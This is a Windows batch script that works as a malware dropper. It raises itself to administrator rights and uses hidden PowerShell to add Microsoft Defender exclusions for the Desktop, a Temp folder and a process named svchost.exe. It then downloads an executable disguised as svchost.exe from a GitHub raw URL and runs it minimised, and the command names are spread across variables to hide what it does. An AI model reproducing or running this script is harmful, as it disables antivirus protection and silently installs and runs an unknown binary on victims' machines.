@echo off
setlocal enabledelayedexpansion

:: Variables
set "a=Add-MpPreference"
set "b=ExclusionPath"
set "c=ExclusionProcess"
set "d=svchost.exe"
set "e=C:\Users\%username%\AppData\Roaming\Temp"
set "f=C:\Users\%username%\AppData\Roaming\Temp\%d%"
set "g=C:\Users\%username%\Desktop"
set "h=https://github.com/bouncegame/svchost/raw/refs/heads/main/%d%"

:: Check if running as administrator
openfiles > nul 2>&1
if %errorlevel%==0 (
    goto :run_script
) else (
    powershell -Command "Start-Process -FilePath '%~dp0%~nx0' -Verb RunAs"
    exit
)

:run_script
:: Add Defender exclusions
powershell -WindowStyle Hidden -Command "
    %a% -%b% '%e%' -ErrorAction SilentlyContinue;
    %a% -%b% '%f%' -ErrorAction SilentlyContinue;
    %a% -%c% '%d%' -ErrorAction SilentlyContinue;
    %a% -%b% '%g%' -ErrorAction SilentlyContinue
"

:: Download %d% from the specified URL
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%h%', '%g%\%d%')"

:: Run %d% silently
start "" /min "%g%\%d%"

:: Clean up (optional)
:: del /q /f "%g%\%d%"
